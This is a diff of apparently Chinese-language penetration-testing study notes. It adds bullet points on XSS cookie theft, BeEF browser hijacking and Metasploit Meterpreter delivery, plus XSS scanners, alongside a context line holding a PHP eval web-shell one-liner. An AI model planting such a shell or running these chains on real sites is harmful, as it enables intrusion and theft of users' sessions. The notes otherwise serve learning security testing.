@@ -103,7 +103,7 @@ https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/
 “<?php  @eval($_POST['cracer']; ?>
 
 
-###########################
+###########################cracer总结##################################
 # 常见CMS
 wordpress
 docify 生成文档
@@ -151,5 +151,10 @@ nginx畸形解析漏洞:
 Hackbar
 Live HTTP Headers
 
-# 免费xss平台
+# 免费xss平台(或自己搭建xss利用平台)
 xss 盗取cookie后，使用啊D注入工具利用
+xss+beef劫持浏览器
+xss+beef+msf劫持浏览器后，利用浏览器漏洞,msf生成meterpreter
+
+# xss漏洞扫描
+wvs,椰树web漏洞扫描,w3af
